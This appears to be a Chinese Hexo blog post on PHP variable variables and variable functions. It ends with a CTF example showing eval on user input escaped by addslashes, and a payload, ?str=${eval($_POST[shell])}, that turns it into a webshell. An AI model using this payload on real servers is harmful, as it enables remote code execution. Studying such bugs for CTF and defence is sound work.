@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
+
+
+
+
+
+
+<meta name="description" content="可变变量就是说，一个变量的变量名可以动态的设置和使用。有两个特例 超全局变量和$this">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php可变变量">
+<meta property="og:url" content="http://yoursite.com/2019/09/25/php可变变量/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="可变变量就是说，一个变量的变量名可以动态的设置和使用。有两个特例 超全局变量和$this">
+<meta property="og:locale" content="zh">
+<meta property="og:updated_time" content="2019-09-25T11:32:19.537Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php可变变量">
+<meta name="twitter:description" content="可变变量就是说，一个变量的变量名可以动态的设置和使用。有两个特例 超全局变量和$this">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/25/php可变变量/">
+
+
+
+
+
+  <title>php可变变量 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/25/php可变变量/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php可变变量</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-25T15:58:51+08:00">
+                2019-09-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>可变变量就是说，一个变量的变量名可以动态的设置和使用。有两个特例 超全局变量和$this</p>
+<a id="more"></a>
+
+<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><h3 id><a href="#" class="headerlink" title="$$"></a>$$</h3><p> 就是用一个变量的值，去声明另一个变量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'hello'</span>;</span><br><span class="line">$$a = <span class="string">'world'</span>;</span><br><span class="line"><span class="keyword">echo</span> $hello;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//输出 world</span></span><br></pre></td></tr></table></figure>
+
+<p>但是这种情况下有一个问题，比如$$a[1] 这种方式，就有两种意思</p>
+<p>第一种</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$a分割[<span class="number">1</span>]     ==&gt; $hello[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
+
+<p>第二种</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$分割$a[<span class="number">1</span>]     ==&gt; $h</span><br></pre></td></tr></table></figure>
+
+<p>针对上面两种方式就产生了 一种新的表达方式</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title="{}"></a>{}</h3><p>可以起到分割的作用</p>
+<p>第一种情况，这样表示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$a&#125;[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
+
+<p>第二种情况。这样表示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$a[<span class="number">1</span>]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有一点要注意双引号不会去解析$$这种变量，还有单引号是不会去解析$ 以及{}</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$varname = <span class="string">"foo"</span>;</span><br><span class="line">$foo = <span class="string">"bar"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $$varname;  <span class="comment">// Prints "bar"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"$$varname"</span>;  <span class="comment">// Prints "$foo"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"$&#123;$varname&#125;"</span>; <span class="comment">// Prints "bar"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'$&#123;$varname&#125;'</span>;  <span class="comment">//$&#123;$varname&#125; </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="再进一步"><a href="#再进一步" class="headerlink" title="再进一步 ${}"></a>再进一步 ${}</h3><p>看个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'ONE'</span>, <span class="number">1</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">one</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$one = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">$&#123;<span class="string">"foo$one"</span>&#125; = <span class="string">'foo'</span>;</span><br><span class="line"><span class="keyword">echo</span> $foo1; <span class="comment">// foo</span></span><br><span class="line">$&#123;<span class="string">'foo'</span> . ONE&#125; = <span class="string">'bar'</span>;     <span class="comment">//和常量进行构造</span></span><br><span class="line"><span class="keyword">echo</span> $foo1; <span class="comment">// bar</span></span><br><span class="line">$&#123;<span class="string">'foo'</span> . one()&#125; = <span class="string">'baz'</span>;  <span class="comment">//这里有空格也没事</span></span><br><span class="line"><span class="keyword">echo</span> $foo1; <span class="comment">// baz</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看上面的${}</p>
+<p>分析一下</p>
+<h4 id="no-1"><a href="#no-1" class="headerlink" title="no.1"></a>no.1</h4><p>直接这样写 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"foo$one"</span> = <span class="string">'foo'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>报错</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parse error:  syntax error, unexpected <span class="string">'='</span></span><br></pre></td></tr></table></figure>
+
+<p>这样写的意思是一个字符串，不能给一个字符串赋值。所以报错</p>
+<h4 id="no-2"><a href="#no-2" class="headerlink" title="no.2"></a>no.2</h4><p>加上{}试试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"foo$one"</span>&#125; = <span class="string">'foo'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>报错</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parse error: syntax error, unexpected <span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<p>加上{}也不能解析变量，也就是说，{}只是一个分割的作用</p>
+<h4 id="no-3"><a href="#no-3" class="headerlink" title="no.3"></a>no.3</h4><p>再加上$</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">"foo$one"</span>&#125; = <span class="string">'foo'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以，也就是说，${}能起到一个声明变量的作用</p>
+<p>在看一个例子，加深一下印象</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$foo = <span class="string">'info'</span>;</span><br><span class="line">$&#123;<span class="string">"php$foo"</span>&#125;();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Undefined variable: phpinfo</span><br></pre></td></tr></table></figure>
+
+<p>没有定义phpinfo这个变量</p>
+<p>加上一个phpinfo这个变量试试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phpinfo=<span class="string">'phpinfo'</span>;</span><br><span class="line">$foo = <span class="string">'info'</span>;</span><br><span class="line">$&#123;<span class="string">"php$foo"</span>&#125;();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>success</p>
+<h2 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h2><p>上面这个例子还牵扯到了可变函数</p>
+<p>如果一个变量名后面有括号，那么php会尝试寻找和这个变量的值同名的函数来执行，或者是一个字符串后面有括号，那么php会把这个字符串，当作函数名来执行</p>
+<p>变量名的方式就类似于上面那个</p>
+<p>再来个字符串方式的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">"phpinfo"</span>)();  <span class="comment">//括号可以表示一个字符串</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="一道ctf"><a href="#一道ctf" class="headerlink" title="一道ctf"></a>一道ctf</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str= @(string)$_GET[<span class="string">'str'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'$str="'</span>.addslashes($str).<span class="string">'";'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有双引号可以解析变量</p>
+<p>这里有一个知识点php种规定如果可变变量里面是函数，那么就把函数的返回值作为变量的名字</p>
+<p>输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功执行phpinfo后，最下面会出现一行报错  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Undefined variable: 1</span><br></pre></td></tr></table></figure>
+
+<p>没有定义的变量1 这里没有定义1这个变量 <u>php中变量名是有规定的以$开头 后面要+字母，以数字命名的变量是不合法的</u></p>
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=$&#123;<span class="keyword">eval</span>($_POST[shell])&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考链接</p>
+<p><a href="https://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.variables.variable.php</a></p>
+<p><a href="https://www.anquanke.com/post/id/176331#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176331#h2-1</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/25/php-fpm/" rel="next" title="php-fpm&&cgi">
+                <i class="fa fa-chevron-left"></i> php-fpm&&cgi
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="John Doe">
+          <p class="site-author-name" itemprop="name">John Doe</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#可变变量"><span class="nav-number">1.</span> <span class="nav-text">可变变量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.1.</span> <span class="nav-text">$$</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-number">1.2.</span> <span class="nav-text">{}</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#再进一步"><span class="nav-number">1.3.</span> <span class="nav-text">再进一步 ${}</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#no-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">no.1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#no-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">no.2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#no-3"><span class="nav-number">1.3.3.</span> <span class="nav-text">no.3</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#可变函数"><span class="nav-number">2.</span> <span class="nav-text">可变函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#一道ctf"><span class="nav-number">2.0.1.</span> <span class="nav-text">一道ctf</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
